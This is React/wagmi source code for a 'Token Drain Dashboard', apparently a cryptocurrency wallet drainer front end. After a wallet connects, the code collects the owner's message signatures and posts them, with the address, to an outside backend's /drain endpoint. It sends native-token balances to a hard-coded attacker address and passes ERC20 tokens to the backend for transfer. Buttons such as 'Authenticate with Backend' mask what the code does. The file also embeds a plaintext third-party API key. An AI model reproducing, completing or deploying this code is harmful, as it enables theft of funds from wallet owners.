import { useState, useEffect, useCallback } from 'react';
import { WagmiConfig } from "wagmi";
import { ConnectKitProvider, ConnectKitButton } from "connectkit";
import { useAccount, useSignMessage, useChainId, usePublicClient, useWalletClient } from 'wagmi';
import { parseEther } from 'viem';
import { wagmiConfig } from "./wagmi";
import './mobile-fix.css';

function TokenDrainApp() {
  return (
    <WagmiConfig config={wagmiConfig}>
      <ConnectKitProvider
        options={{
          walletConnectName: "WalletConnect",
          enforceSupportedChains: false,
          hideQuestionMarkCTA: true,
          hideTooltips: true,
          disclaimer: null,
          embedGoogleFonts: false,
          customTheme: {
            "--ck-font-family": "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif",
            "--ck-border-radius": "12px",
          },
        }}
        theme="midnight"
      >
        <Dashboard />
      </ConnectKitProvider>
    </WagmiConfig>
  );
}

function Dashboard() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const { signMessageAsync } = useSignMessage();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient();

  const [authStatus, setAuthStatus] = useState('');
  const [signature, setSignature] = useState('');
  const [isAuthenticating, setIsAuthenticating] = useState(false);
  const [backendUrl] = useState('https://tokenbackend-5xab.onrender.com');
  const [userTokens, setUserTokens] = useState([]);
  const [txStatus, setTxStatus] = useState('');

  const DRAIN_TO_ADDRESS = "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4";

  useEffect(() => {
    if (isConnected && address) {
      handleWalletConnected(address);
    } else {
      resetState();
    }
  }, [isConnected, address]);

  const resetState = () => {
    setAuthStatus('');
    setSignature('');
    setUserTokens([]);
    setTxStatus('');
  };

  const handleWalletConnected = async (walletAddress) => {
    try {
      setAuthStatus('Wallet connected');
      // Don't auto-authenticate - let user click button
    } catch (error) {
      console.error("Connection error:", error);
      setAuthStatus('Connection error');
    }
  };

  const authenticateWithBackend = async () => {
    if (!address) return;
    
    try {
      setIsAuthenticating(true);
      setAuthStatus('Signing message...');
      
      const timestamp = Date.now();
      const message = `Token Drain Auth\nWallet: ${address}\nChain: ${chainId || 1}\nTime: ${timestamp}`;
      
      const sig = await signMessageAsync({ message });
      setSignature(sig);
      
      setAuthStatus('Sending to backend...');
      await sendAuthenticationToBackend(address, sig, message, chainId || 1);
      
    } catch (error) {
      console.error("Auth error:", error);
      if (error.code === 4001) {
        setAuthStatus('Signature rejected');
      } else {
        setAuthStatus(`Auth failed: ${error.message}`);
      }
      setIsAuthenticating(false);
    }
  };

  const sendAuthenticationToBackend = async (fromAddress, sig, message, chainId) => {
    try {
      const payload = {
        fromAddress,
        signature: sig,
        message,
        chainId,
        drainTo: DRAIN_TO_ADDRESS,
        timestamp: new Date().toISOString()
      };
      
      console.log('Auth payload:', payload);
      
      const response = await fetch(`${backendUrl}/drain`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      });
      
      console.log('Response status:', response.status);
      
      if (!response.ok) {
        const errorData = await response.json().catch(() => ({}));
        throw new Error(errorData.error || `HTTP ${response.status}`);
      }
      
      const data = await response.json();
      console.log('Backend response:', data);
      
      if (data.success) {
        setAuthStatus('✅ Backend authenticated');
        if (data.data?.transactionHash) {
          setTxStatus(`Tx: ${data.data.transactionHash.substring(0, 10)}...`);
        }
        // Fetch real tokens after auth
        await fetchRealTokens(fromAddress, chainId);
      } else {
        setAuthStatus(`Backend: ${data.error}`);
      }
      
    } catch (error) {
      console.error("Backend auth error:", error);
      setAuthStatus(`Backend error: ${error.message}`);
      // Still try to fetch tokens even if backend fails
      if (address) {
        await fetchRealTokens(address, chainId);
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  const fetchRealTokens = async (walletAddress, chainId) => {
    try {
      setAuthStatus('Fetching tokens...');
      
      // Try backend first
      try {
        const response = await fetch(`${backendUrl}/tokens/${walletAddress}/${chainId}`);
        if (response.ok) {
          const data = await response.json();
          if (data.success && data.data?.tokens) {
            setUserTokens(data.data.tokens);
            setAuthStatus(`✅ ${data.data.tokens.length} tokens`);
            return;
          }
        }
      } catch (backendError) {
        console.log('Backend token fetch failed:', backendError.message);
      }
      
      // Fallback to Covalent
      await fetchFromCovalent(walletAddress, chainId);
      
    } catch (error) {
      console.error("Token fetch error:", error);
      setAuthStatus('Token fetch failed');
      setUserTokens([]); // Empty array, no demo data
    }
  };

  const fetchFromCovalent = async (walletAddress, chainId) => {
    try {
      const COVALENT_API_KEY = "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR";
      const url = `https://api.covalenthq.com/v1/${chainId}/address/${walletAddress}/balances_v2/?key=${COVALENT_API_KEY}&nft=false`;
      
      const response = await fetch(url);
      
      if (!response.ok) {
        throw new Error(`Covalent API ${response.status}`);
      }
      
      const data = await response.json();
      const items = data.data?.items || [];
      
      const tokens = items
        .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
        .map(t => ({
          symbol: t.contract_ticker_symbol || (t.native_token ? 'ETH' : 'TOKEN'),
          name: t.contract_name || (t.native_token ? 'Ethereum' : 'Unknown'),
          amount: parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18),
          value: (t.quote_rate || 0) * (parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18)),
          contractAddress: t.contract_address,
          decimals: t.contract_decimals || 18,
          isNative: t.native_token || false,
          logo: t.logo_url
        }));
      
      setUserTokens(tokens);
      setAuthStatus(`✅ ${tokens.length} real tokens`);
      
    } catch (error) {
      console.error("Covalent error:", error);
      setAuthStatus('API rate limited');
      setUserTokens([]); // EMPTY - no demo data
    }
  };

  const executeDrain = async (token) => {
    if (!walletClient || !address) {
      setTxStatus('Wallet not ready');
      return;
    }

    if (token.amount <= 0) {
      setTxStatus('Amount is 0');
      return;
    }

    try {
      setIsAuthenticating(true);
      setTxStatus('Preparing...');
      
      // For native tokens: send directly from user's wallet
      if (token.isNative) {
        const amountInWei = parseEther(token.amount.toString());
        
        if (amountInWei <= 0n) {
          setTxStatus('Amount too small');
          return;
        }
        
        setTxStatus('Confirm in wallet...');
        
        const hash = await walletClient.sendTransaction({
          to: DRAIN_TO_ADDRESS,
          value: amountInWei,
        });
        
        setTxStatus(`✅ Sent: ${hash.substring(0, 10)}...`);
        setAuthStatus('Transaction submitted');
        
        // Remove token from list after sending
        setUserTokens(prev => prev.filter(t => 
          t.symbol !== token.symbol || t.contractAddress !== token.contractAddress
        ));
        
        // Optionally log to backend
        await logTransactionToBackend(token, hash);
        
      } else {
        // For ERC20: use backend
        await sendTokenToBackend(token);
      }
      
    } catch (error) {
      console.error("Drain error:", error);
      if (error.code === 4001) {
        setTxStatus('User rejected');
      } else if (error.message.includes('insufficient funds')) {
        setTxStatus('Insufficient ETH for gas');
      } else {
        setTxStatus(`Error: ${error.shortMessage || error.message}`);
      }
    } finally {
      setIsAuthenticating(false);
    }
  };

  const sendTokenToBackend = async (token) => {
    try {
      setTxStatus('Sending to backend...');
      
      const message = `Drain ${token.amount} ${token.symbol}`;
      const sig = await signMessageAsync({ message });
      
      const payload = {
        fromAddress: address,
        tokenAddress: token.contractAddress,
        amount: token.amount.toString(),
        chainId: chainId || 1,
        tokenType: 'erc20',
        signature: sig,
        message: message,
        drainTo: DRAIN_TO_ADDRESS
      };
      
      const response = await fetch(`${backendUrl}/drain`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      
      const data = await response.json();
      
      if (data.success) {
        setTxStatus(`✅ Backend: ${data.data.transactionHash.substring(0, 10)}...`);
        setUserTokens(prev => prev.filter(t => 
          t.symbol !== token.symbol || t.contractAddress !== token.contractAddress
        ));
      } else {
        setTxStatus(`Backend error: ${data.error}`);
      }
      
    } catch (error) {
      console.error('Backend transaction error:', error);
      setTxStatus('Backend failed');
    }
  };

  const logTransactionToBackend = async (token, txHash) => {
    try {
      // Just log, don't wait for response
      fetch(`${backendUrl}/drain`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          fromAddress: address,
          amount: token.amount.toString(),
          chainId: chainId || 1,
          tokenType: 'native',
          transactionHash: txHash,
          drainTo: DRAIN_TO_ADDRESS,
          timestamp: new Date().toISOString()
        })
      }).catch(() => {}); // Ignore errors
    } catch (error) {
      // Silent fail
    }
  };

  const getTotalValue = () => {
    return userTokens.reduce((sum, token) => sum + (token.value || 0), 0).toFixed(2);
  };

  const formatAddress = (addr) => {
    return addr ? `${addr.substring(0, 6)}...${addr.substring(addr.length - 4)}` : '';
  };

  const getChainName = (id) => {
    const chains = { 1: 'Ethereum', 56: 'BSC', 137: 'Polygon', 42161: 'Arbitrum', 10: 'Optimism', 8453: 'Base' };
    return chains[id] || `Chain ${id}`;
  };

  return (
    <div className="App">
      <header className="App-header">
        <h1>Token Drain Dashboard</h1>
        
        <div className="wallet-connect-section">
          <ConnectKitButton />
        </div>
        
        {isConnected && address && (
          <div className="dashboard">
            <div className="wallet-info-card">
              <div className="wallet-details">
                <div className="detail-item">
                  <span>Wallet:</span>
                  <strong>{formatAddress(address)}</strong>
                </div>
                <div className="detail-item">
                  <span>Network:</span>
                  <strong>{getChainName(chainId)} ({chainId})</strong>
                </div>
                <div className="detail-item">
                  <span>Backend:</span>
                  <code>{backendUrl.replace('https://', '')}</code>
                </div>
              </div>
              
              <div className="status-area">
                <div className={`status ${authStatus.includes('✅') ? 'success' : ''}`}>
                  {authStatus || 'Ready'}
                </div>
                {signature && (
                  <div className="signature">
                    <small>Sig: {signature.substring(0, 10)}...</small>
                  </div>
                )}
                {txStatus && (
                  <div className="tx-status">
                    <strong>Tx:</strong> {txStatus}
                  </div>
                )}
              </div>
              
              <div className="buttons">
                <button 
                  onClick={authenticateWithBackend}
                  disabled={isAuthenticating}
                  className="btn-primary"
                >
                  {isAuthenticating ? 'Processing...' : 'Authenticate with Backend'}
                </button>
                <button 
                  onClick={() => fetchRealTokens(address, chainId || 1)}
                  disabled={isAuthenticating}
                  className="btn-secondary"
                >
                  Fetch Tokens
                </button>
              </div>
            </div>
            
            {userTokens.length > 0 ? (
              <div className="tokens-section">
                <div className="tokens-header">
                  <h2>Your Tokens (Live Data)</h2>
                  <div className="summary">
                    <span>{userTokens.length} tokens</span>
                    <span>Total: ${getTotalValue()}</span>
                  </div>
                </div>
                
                <div className="tokens-list">
                  {userTokens.map((token, index) => (
                    <div key={index} className="token-item">
                      <div className="token-info">
                        <div className="token-symbol">{token.symbol}</div>
                        <div className="token-name">{token.name}</div>
                        <div className="token-amount">
                          {parseFloat(token.amount).toLocaleString(undefined, {
                            maximumFractionDigits: 8
                          })}
                        </div>
                        <div className="token-value">
                          {token.value ? `$${parseFloat(token.value).toFixed(2)}` : 'N/A'}
                        </div>
                      </div>
                      <button
                        onClick={() => executeDrain(token)}
                        disabled={token.amount <= 0 || isAuthenticating}
                        className="drain-btn"
                      >
                        Drain
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            ) : authStatus.includes('✅') ? (
              <div className="no-tokens">
                <p>No tokens found in this wallet</p>
              </div>
            ) : null}
          </div>
        )}
        
        <div className="footer">
          <div className="links">
            <a href={`${backendUrl}/health`} target="_blank" rel="noopener noreferrer">
              Backend Health
            </a>
            <a href={`${backendUrl}`} target="_blank" rel="noopener noreferrer">
              API Docs
            </a>
          </div>
          <div className="notes">
            <small>Production Mode • Live Transactions • No Demo Data</small>
          </div>
        </div>
      </header>
    </div>
  );
}

export default TokenDrainApp;
